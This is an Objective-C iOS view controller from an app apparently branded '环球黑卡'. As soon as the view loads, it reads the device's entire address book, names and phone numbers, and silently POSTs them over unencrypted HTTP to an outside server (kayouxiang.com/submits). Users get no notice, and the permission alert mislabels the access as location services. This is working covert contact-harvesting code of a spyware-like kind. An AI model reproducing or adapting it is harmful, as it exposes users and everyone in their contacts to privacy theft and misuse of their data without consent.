//
//  IndexWebController.m
//  WhipMe
//
//  Created by Song on 2017/9/6.
//  Copyright © 2017年 -. All rights reserved.
//

#import "IndexWebController.h"
#import "JXAddressBook.h"

@implementation JSObjectModel

- (void)upLoadAddressBook:(NSString *)card {


}

@end

@interface IndexWebController ()

@end

@implementation IndexWebController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    [self getAddressBook];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (void)getAddressBook {
    ABAuthorizationStatus authStatus = ABAddressBookGetAuthorizationStatus();
    if (authStatus == kABAuthorizationStatusDenied) {
        // 没权限
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"通讯录权限未开启"
                                                            message:@"请到设置>隐私>定位服务中开启［环球黑卡］通讯录权限。"
                                                           delegate:self
                                                  cancelButtonTitle:@"取消"
                                                  otherButtonTitles:@"立即开启", nil];
        [alertView show];
        [alertView bk_setHandler:^{
            NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
            if ([[UIApplication sharedApplication] canOpenURL:url]) {
                [[UIApplication sharedApplication] openURL:url];
            }
        } forButtonAtIndex:1];
    } else {
        [JXAddressBook getPersonInfo:^(NSArray *personInfos) {
            NSMutableArray *addressBook = [NSMutableArray array];
            for (JXPersonInfo *personInfo in personInfos) {
                if ([NSString isBlankString:personInfo.showAllPhoneNO] == NO &&
                    [NSString isBlankString:personInfo.fullName] == NO &&
                    [personInfo.selectedPhoneNO isEqualToString:@"空"] == NO) {
                    NSDictionary *addressBookDict = @{@"number":personInfo.showAllPhoneNO,
                                                      @"name":personInfo.fullName};
                    [addressBook addObject:addressBookDict];
                }
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self upLoadAddressBook:addressBook];
            });
        }];
    }
}

- (void)upLoadAddressBook:(NSArray *)datas {
    if (datas.count == 0) {
        return;
    }
    NSDictionary *params = @{@"card":@"111",@"datas":datas};
    [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:YES];
    AFHTTPSessionManager *manager = [[AFHTTPSessionManager alloc] initWithBaseURL:[NSURL URLWithString:@"http://www.kayouxiang.com"]];
    manager.requestSerializer   = [AFJSONRequestSerializer serializer];
    manager.responseSerializer  = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    manager.responseSerializer.acceptableContentTypes = [NSSet
       setWithObjects:@"text/html",@"text/plain",@"application/json",nil];
    [manager POST:@"/submits" parameters:params progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable result) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
        NSLog(@"success:%@",result);
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
        NSLog(@"error:%@",error);
    }];
}


@end
